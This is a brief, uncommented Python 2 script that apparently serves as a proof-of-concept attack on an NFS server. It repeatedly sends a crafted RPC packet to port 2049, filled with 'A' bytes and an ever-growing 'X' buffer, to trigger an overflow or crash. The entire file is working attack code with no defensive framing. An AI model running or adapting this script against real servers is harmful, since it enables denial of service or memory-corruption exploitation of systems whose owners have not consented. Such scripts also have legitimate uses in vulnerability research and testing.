#!/usr/bin/env python2
from socket import *
import struct
import random
import binascii
import time

host='localhost'
port=2049


def pack_len(buf):
 	l = len(buf)
	length = l | 0x80000000L
	size = (chr(int(length>>24 & 0xff)) + chr(int(length>>16 & 0xff)) + chr(int(length>>8 & 0xff)) + chr(int(length & 0xff)))
	return size



pkt="""
 00 00 00 00 00 00 00 02
 00 01 86 a3 00 00 00 02 00 00 00 0a 00 00 00 01
 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 1c 41 41 41 41 41 41 41 41 41 41 41 41
 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
 ff ff ff ff 

"""
pkt = pkt.replace(' ','')
pkt = pkt.replace('\n','')
pkt = binascii.unhexlify(pkt)

bufsiz = 4096
for i in range(10000):
	print 'iteration %d' % i

	xid = random.randint(1, 0x41424344)
	buf = struct.pack('<L',xid)  + pkt + 'X' * bufsiz
	buf = pack_len(buf) + buf 


	sock=socket(AF_INET,SOCK_STREAM)
	sock.connect((host,port))
	sock.sendall(buf)
	sock.close()

	print 'sent %d bytes' % len(pkt)

	time.sleep(0.5)

	bufsiz += 4096
